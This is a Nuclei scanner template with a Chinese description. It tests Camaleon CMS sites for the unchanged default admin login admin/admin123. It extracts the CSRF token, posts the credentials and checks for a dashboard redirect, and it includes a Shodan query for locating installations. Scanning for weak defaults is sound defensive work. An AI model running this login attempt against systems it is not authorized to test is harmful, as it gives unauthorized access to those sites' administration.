id: camaleon-default-login

info:
  name: Camaleon CMS 默认口令登录（弱口令）
  author: DhiyaneshDK
  severity: high
  description: |
    该模板通过尝试 Camaleon CMS 的默认账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  metadata:
    vendor: tuzitio
    product: camaleon_cms
    shodan-query: html:"camaleon_cms"
  tags: camaleon,default-login,vuln

variables:
  username: "admin"
  password: "admin123"

flow: http(1) && http(2)

http:
  - raw:
      - |
        GET /admin/login HTTP/1.1
        Host: {{Hostname}}

    extractors:
      - type: regex
        part: body
        internal: true
        name: nonce
        group: 1
        regex:
          - 'name="authenticity_token" value="(.*?)"'

  - raw:
      - |
        POST /admin/login HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        authenticity_token={{nonce}}&user%5Busername%5D={{username}}&user%5Bpassword%5D={{password}}

    matchers-condition: and
    matchers:
      - type: dsl
        dsl:
          - 'contains(location,"/admin/dashboard")'
